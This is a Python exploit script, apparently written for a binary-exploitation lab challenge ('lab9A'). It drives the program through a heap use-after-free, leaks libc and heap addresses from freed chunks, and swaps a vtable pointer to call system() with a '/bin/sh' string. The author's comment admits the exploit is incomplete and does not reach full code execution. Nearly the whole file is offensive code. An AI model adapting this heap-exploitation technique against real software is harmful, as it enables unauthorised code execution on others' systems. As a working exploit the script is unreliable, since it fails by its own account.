#!/usr/bin/python

# 
# This exploit is *almost* working, it ends up in invoking system("<garbage>") whereas
# garbage is a current vtable pointer, due to specific stack layout after vtable swapping.
# Unfortunately, I didn't make it into full RCE.
#

import sys
import pexpect
import ctypes
import struct
import time

proc = None
logfile = open("/tmp/log4.txt", "w")

# HashSet original vtable pointer's value
original_vtable_pointer = 0x08049aa8

# distance between fastbin free chunk BK pointer to the libc base
libc_fastbin_bk_pointer_offset = 0x1aa450

# Offsets relative to libc base address
system_offset = 0x40190
bin_sh_offset = 0x160a24

def unpack(x):
    return struct.unpack("<I", x)[0]

def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            c = c.replace('\r', '\n')
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        logfile.write(str(param) + "\n")
        out.extend(readall())
        time.sleep(0.1)
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: exploit.py <IP>"
        sys.exit(1)

    #prog = "nc %s 9941" % sys.argv[1]
    prog = "/levels/lab09/lab9A"
    print "Connecting to %s..." % sys.argv[1]
    proc = pexpect.spawn(prog, timeout=0.1)

    print "Step 1: Allocate two lockboxes"
    
    # First allocation of elements must be of size greater than max fastbin
    # in order to make the further unlink code set up fd i bk pointers for us
    # within unlinked chunk. Those pointer shall be further leaked by us.
    # Therefore, number of elements must be greater than 16
    interact(1, 1, 16)
    interact(1, 2, 16)

    print "Step 2: Free those lockboxes and leak libc base address"
    print "\t2.1. Free lockboxes"
    interact(4, 2)
    interact(4, 1)

    print "\t2.2. Repair first lockbox vtable pointer by allocating first lockbox again"
    interact(1, 1, 16)

    print "\t2.3. And now leak the chunk bk pointer thus libc base address"
    out = interact(3, 1, 1)[6]
    out = out[out.find('=')+2:-1]
    bk = ctypes.c_uint32(int(out)).value
    libc_base = ctypes.c_uint32(bk - libc_fastbin_bk_pointer_offset).value

    system_addr = ctypes.c_uint32(libc_base + system_offset).value
    bin_sh_addr = ctypes.c_uint32(libc_base + bin_sh_offset).value

    print "\t\tsystem() @ 0x%08x" % system_addr
    print "\t\t'/bin/sh' @ 0x%08x" % bin_sh_addr

    print "\t2.4. Leak heap pointer to calculate heap's base address"
    interact(4, 1)
    interact(1, 1, 4)
    out = interact(3, 1, 3)[6]
    out = out[out.find('=')+2:-1]
    heap_base = (ctypes.c_uint32(int(out)).value & 0xfffff000)

    print "\t\tHeap's base address: 0x%08x" % heap_base

    print "Step 3: Normalize heap and leverage malloc's first-fit strategy"
    print "\t3.1. Allocate and free temporary lockbox"
    #interact(4, 1)

    print "\t3.2. Restart entire first-fit exploitation process"
    interact(1, 3, 8)
    interact(1, 4, 8)
    interact(4, 4)
    interact(4, 3)
    
    # 4 elements = means 16 bytes to allocate, which will make the New allocator
    # occupy previously freed HashSet object (which is of size 16 bytes).
    # This allocation leverages ptmalloc's first-fit allocation strategy.
    print "\t3.3. Allocate third lockbox with number of elements equal 4"
    interact(1, 3, 4)

    print "Step 4: Fill up those elements within third lockbox"

    chunk_address = heap_base + 0x90

    interact(2, 1, system_addr)
    interact(2, 3, chunk_address - 8)
    interact(2, 3, 0x7c7c2062) # "|| b"
    interact(2, 3, 0x6173683b) # "ash;"

    print "Step 5: Invoke second lockbox's add() method"
    print interact(2, 4, bin_sh_addr)

    #shell()
    logfile.close()

